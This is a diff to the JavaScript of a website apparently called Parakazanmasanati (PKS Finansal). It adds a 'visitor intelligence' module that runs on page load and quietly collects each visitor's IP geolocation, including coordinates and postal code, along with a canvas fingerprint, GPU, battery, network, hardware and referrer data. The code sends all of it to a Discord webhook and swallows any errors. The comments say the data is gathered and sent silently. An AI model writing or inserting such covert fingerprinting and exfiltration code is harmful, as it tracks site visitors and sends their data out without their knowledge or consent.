@@ -276,9 +276,226 @@ document.addEventListener("click", (e) => {
   }
 });
 
-// ================= 7. BAŞLANGIÇ: ZİYARETÇİ GİRİŞİ KAYDI & DDOS SHIELD =================
+// ================= 7. GELİŞMİŞ ZİYARETÇİ İSTİHBARAT MODÜLÜ =================
+
+// 7a. Canvas Fingerprint — her cihazda unique hash üretir
+function _pksCanvasHash() {
+  try {
+    const c = document.createElement("canvas");
+    c.width = 280; c.height = 60;
+    const ctx = c.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(100, 1, 62, 20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("PKSfingerprint🖐️", 2, 15);
+    ctx.fillStyle = "rgba(102,204,0,0.7)";
+    ctx.fillText("PKSfingerprint🖐️", 4, 17);
+    const raw = c.toDataURL();
+    // simple djb2 hash
+    let hash = 5381;
+    for (let i = 0; i < raw.length; i++) {
+      hash = ((hash << 5) + hash) + raw.charCodeAt(i);
+      hash = hash & hash; // 32-bit int
+    }
+    return (hash >>> 0).toString(16).toUpperCase();
+  } catch(e) { return "N/A"; }
+}
+
+// 7b. WebGL GPU / Renderer bilgisi
+function _pksWebGLInfo() {
+  try {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (!gl) return { vendor: "N/A", renderer: "N/A" };
+    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+      renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
+    };
+  } catch(e) { return { vendor: "N/A", renderer: "N/A" }; }
+}
+
+// 7c. Yüklü eklentiler listesi
+function _pksPlugins() {
+  try {
+    const p = navigator.plugins;
+    if (!p || p.length === 0) return "Yok / Gizli";
+    const names = [];
+    for (let i = 0; i < Math.min(p.length, 10); i++) {
+      names.push(p[i].name);
+    }
+    return names.join(", ");
+  } catch(e) { return "N/A"; }
+}
+
+// 7d. Depolama destek tespiti
+function _pksStorageSupport() {
+  const s = [];
+  try { if (window.localStorage) s.push("LocalStorage ✅"); } catch(e) { s.push("LocalStorage ❌"); }
+  try { if (window.sessionStorage) s.push("SessionStorage ✅"); } catch(e) { s.push("SessionStorage ❌"); }
+  try { if (window.indexedDB) s.push("IndexedDB ✅"); } catch(e) { s.push("IndexedDB ❌"); }
+  try { if (document.cookie !== undefined) s.push("Cookies ✅"); } catch(e) { s.push("Cookies ❌"); }
+  return s.join(" • ");
+}
+
+// 7e. Batarya bilgisi (async)
+async function _pksBattery() {
+  try {
+    if (!navigator.getBattery) return null;
+    const b = await navigator.getBattery();
+    return {
+      level: Math.round(b.level * 100) + "%",
+      charging: b.charging ? "⚡ Şarjda" : "🔋 Pilde",
+      chargingTime: b.chargingTime === Infinity ? "∞" : Math.round(b.chargingTime / 60) + " dk",
+      dischargingTime: b.dischargingTime === Infinity ? "∞" : Math.round(b.dischargingTime / 60) + " dk"
+    };
+  } catch(e) { return null; }
+}
+
+// 7f. Network / Bağlantı bilgisi
+function _pksNetwork() {
+  try {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!conn) return null;
+    return {
+      type: conn.effectiveType || "N/A",
+      downlink: conn.downlink ? conn.downlink + " Mbps" : "N/A",
+      rtt: conn.rtt ? conn.rtt + " ms" : "N/A",
+      saveData: conn.saveData ? "Açık" : "Kapalı"
+    };
+  } catch(e) { return null; }
+}
+
+// 7g. Ana istihbarat toplayıcı — IP + fingerprint + hardware
+async function _pksGatherIntel() {
+  // IP & Geolocation (public API)
+  let ipData = {};
+  try {
+    const r = await fetch("https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query", { cache: "no-store" });
+    ipData = await r.json();
+  } catch(e) {
+    try {
+      const r2 = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+      const d = await r2.json();
+      ipData = { query: d.ip, country: d.country_name, city: d.city, regionName: d.region, isp: d.org, timezone: d.timezone, proxy: false };
+    } catch(e2) {
+      ipData = { query: "Alınamadı", country: "N/A", city: "N/A" };
+    }
+  }
+
+  const gpu = _pksWebGLInfo();
+  const canvasHash = _pksCanvasHash();
+  const battery = await _pksBattery();
+  const network = _pksNetwork();
+  const plugins = _pksPlugins();
+  const storage = _pksStorageSupport();
+
+  // Cihaz detayları
+  const cpuCores = navigator.hardwareConcurrency || "N/A";
+  const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
+  const maxTouch = navigator.maxTouchPoints || 0;
+  const platform = navigator.platform || "N/A";
+  const languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;
+  const colorDepth = screen.colorDepth + "-bit";
+  const pixelRatio = window.devicePixelRatio || 1;
+  const screenFull = `${screen.width}x${screen.height} (kullanılabilir: ${screen.availWidth}x${screen.availHeight})`;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const timezoneOffset = "UTC" + (new Date().getTimezoneOffset() > 0 ? "-" : "+") + Math.abs(new Date().getTimezoneOffset() / 60);
+  const dnt = navigator.doNotTrack === "1" ? "Açık" : "Kapalı";
+  const cookieEnabled = navigator.cookieEnabled ? "Evet" : "Hayır";
+  const online = navigator.onLine ? "Çevrimiçi ✅" : "Çevrimdışı ❌";
+
+  // VPN / Proxy tespiti
+  let vpnStatus = "🟢 Normal Bağlantı";
+  if (ipData.proxy === true || ipData.hosting === true) {
+    vpnStatus = "🔴 VPN / Proxy / Hosting IP Tespit Edildi!";
+  }
+
+  // Discord embed oluştur
+  const fields = [
+    { name: "🌐 IP Adresi", value: `\`${ipData.query || "N/A"}\``, inline: true },
+    { name: "📍 Konum", value: `${ipData.city || "N/A"}, ${ipData.regionName || ""} / ${ipData.country || "N/A"}`, inline: true },
+    { name: "🏢 ISP / Ağ", value: `${ipData.isp || "N/A"}`, inline: true },
+    { name: "🛡️ VPN / Proxy", value: vpnStatus, inline: true },
+    { name: "🕐 Timezone", value: `${timezone} (${timezoneOffset})`, inline: true },
+    { name: "🌍 Diller", value: languages, inline: true },
+    { name: "💻 Platform", value: `${platform}`, inline: true },
+    { name: "🖥️ GPU (WebGL)", value: `${gpu.renderer}`, inline: true },
+    { name: "🏭 GPU Üretici", value: `${gpu.vendor}`, inline: true },
+    { name: "⚙️ CPU Çekirdek", value: `${cpuCores} çekirdek`, inline: true },
+    { name: "🧠 RAM (Tahmini)", value: `${ram}`, inline: true },
+    { name: "📱 Dokunmatik", value: `${maxTouch} nokta`, inline: true },
+    { name: "📺 Ekran", value: screenFull, inline: false },
+    { name: "🎨 Renk Derinliği", value: `${colorDepth} • ${pixelRatio}x piksel oranı`, inline: true },
+    { name: "🔒 DNT (İzleme)", value: dnt, inline: true },
+    { name: "🍪 Cookie Desteği", value: cookieEnabled, inline: true },
+    { name: "📶 Çevrimiçi", value: online, inline: true },
+    { name: "🎭 Canvas Parmak İzi", value: `\`0x${canvasHash}\``, inline: true },
+    { name: "🔌 Eklentiler", value: plugins.substring(0, 200), inline: false },
+    { name: "💾 Depolama Desteği", value: storage, inline: false }
+  ];
+
+  // Batarya bilgisi varsa ekle
+  if (battery) {
+    fields.push({ name: "🔋 Batarya", value: `${battery.level} — ${battery.charging} | Dolum: ${battery.chargingTime} | Kalan: ${battery.dischargingTime}`, inline: false });
+  }
+
+  // Network bilgisi varsa ekle
+  if (network) {
+    fields.push({ name: "📡 Bağlantı Tipi", value: `${network.type.toUpperCase()} • ↓${network.downlink} • RTT: ${network.rtt} • Veri Tasarrufu: ${network.saveData}`, inline: false });
+  }
+
+  // Geliş kaynağı
+  const ref = document.referrer || "Doğrudan Giriş";
+  fields.push({ name: "🔗 Geliş Kaynağı", value: ref, inline: false });
+
+  // ASN bilgisi
+  if (ipData.as) {
+    fields.push({ name: "🏷️ ASN", value: ipData.as, inline: false });
+  }
+
+  // Koordinat (varsa)
+  if (ipData.lat && ipData.lon) {
+    fields.push({ name: "📌 Koordinat", value: `[${ipData.lat}, ${ipData.lon}](https://www.google.com/maps?q=${ipData.lat},${ipData.lon})`, inline: true });
+  }
+
+  // Posta kodu
+  if (ipData.zip) {
+    fields.push({ name: "📮 Posta Kodu", value: ipData.zip, inline: true });
+  }
+
+  // Webhook gönder
+  const payload = {
+    username: "PKS İstihbarat Ağı 🕵️",
+    avatar_url: "https://cdn-icons-png.flaticon.com/512/2592/2592004.png",
+    embeds: [{
+      title: "🔍 Yeni Ziyaretçi İstihbarat Raporu",
+      description: `Parakazanmasanati sitesine **yeni bir ziyaretçi bağlandı**. Tüm teknik parmak izi ve ağ bilgileri aşağıda listelenmiştir.`,
+      color: 0x0ea5e9,
+      fields: fields,
+      footer: {
+        text: "PKS Finansal • Gelişmiş Ziyaretçi İstihbarat Sistemi v2.0",
+        icon_url: "https://cdn-icons-png.flaticon.com/512/3135/3135715.png"
+      },
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  // Doğrudan fetch — mevcut queue'yu bypass ederek ayrı gönder
+  try {
+    await fetch(PKS_SECURITY_CONFIG.webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch(e) { /* sessiz hata */ }
+}
+
+// ================= 8. BAŞLANGIÇ: ZİYARETÇİ GİRİŞİ KAYDI & DDOS SHIELD =================
 document.addEventListener("DOMContentLoaded", () => {
-  // İlk ziyaretçi girişi kaydı (Tek bir oturumda bir kez gönderilir)
+  // İlk ziyaretçi girişi kaydı + istihbarat toplama (Tek bir oturumda bir kez)
   if (!sessionStorage.getItem("pks_visit_logged")) {
     sessionStorage.setItem("pks_visit_logged", "true");
     sendPksDiscordLog(
@@ -286,6 +503,9 @@ document.addEventListener("DOMContentLoaded", () => {
       "Parakazanmasanati (PKS Finansal) web sitesine yeni bir kullanıcı bağlandı.",
       0x10b981
     );
+
+    // Gelişmiş istihbaratı sessizce topla ve gönder
+    setTimeout(() => { _pksGatherIntel(); }, 1200);
   }
 
   // DDoS / Bot Doğrulama Ekranı (İlk ziyarette gösterilir)
